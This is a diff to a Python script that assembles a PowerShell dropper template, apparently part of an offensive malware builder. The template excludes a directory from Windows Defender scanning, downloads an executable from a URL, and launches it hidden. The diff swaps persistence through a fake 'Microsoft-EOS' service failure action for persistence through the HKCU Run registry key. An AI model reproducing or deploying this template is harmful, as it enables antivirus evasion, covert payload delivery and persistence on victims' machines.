@@ -68,7 +68,7 @@ def main():
         "Author: ELMERIKH\n" + Style.RESET_ALL
     )
     print(introduction)
-    
+   
     powershell_template = [
     "$directoryPath = Join-Path $HOME '{directory_path}'",
     "Add-MpPreference -ExclusionPath $directoryPath",
@@ -76,21 +76,15 @@ def main():
     "$targetDirectory = Join-Path $HOME '{target_directory}'",
     "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
     "$outputFile = Join-Path $targetDirectory '{output_name}.exe'",
-    "sc.exe create Microsoft-EOS binPath= 'C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.23080.2006-0\\\\MsMpEng.exe' start= auto",
-    "$serviceName = 'Microsoft-EOS'",
-    "$failureCommand = $outputFile",
-    "$actions = @{{'1' = $failureCommand}}",
-    "foreach ($actionNumber in $actions.Keys) {{",
-    
-    "    sc.exe failure $serviceName reset= 86400 actions= 'run/$actionNumber/$failureCommand'",
-    "    sc.exe failureflag $serviceName $actionNumber $actionType",
-    "}}",
-    "sc.exe failure $serviceName  command= $failureCommand",
+    "$programName = '{output_name}'",
+    "$programPath = $outputFile  ",
+    "$registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'",
+    "Set-ItemProperty -Path $registryPath -Name $programName -Value $programPath ",
     "Invoke-WebRequest -Uri $url -OutFile $outputFile",
     "$installerPath = $outputFile",
     "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
-
 ]
+
 
 # Combine the PowerShell lines into a single string
     powershell_script = '\n'.join(powershell_template)
